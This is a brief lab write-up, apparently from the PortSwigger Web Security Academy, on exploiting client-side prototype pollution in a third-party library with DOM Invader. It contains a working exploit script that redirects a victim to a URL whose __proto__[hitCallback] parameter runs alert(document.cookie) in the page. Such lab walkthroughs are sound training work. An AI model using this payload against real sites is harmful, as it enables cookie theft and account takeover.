# Client-side prototype pollution in third-party libraries
Since it's suggested to use DOM Invader in this, that is what I shall do.
After enabling DOM invader, it finds 2 sources. I just tried the first one and scanned for gadgets. It then found a sink and I click exploit. Here, I visited a page that ran `alert(1)`.
I just changed the 1 to document.cookie and wrote the small script that would make the victim visit the site.
```html
<script>
window.location='https://0a7800f604c3684981b87626002900a3.web-security-academy.net/filter?category=Lifestyle#cat=13375&category=Lifestyle&__proto__[hitCallback]=alert%28document.cookie%29'
</script>
```
Then the lab was solved.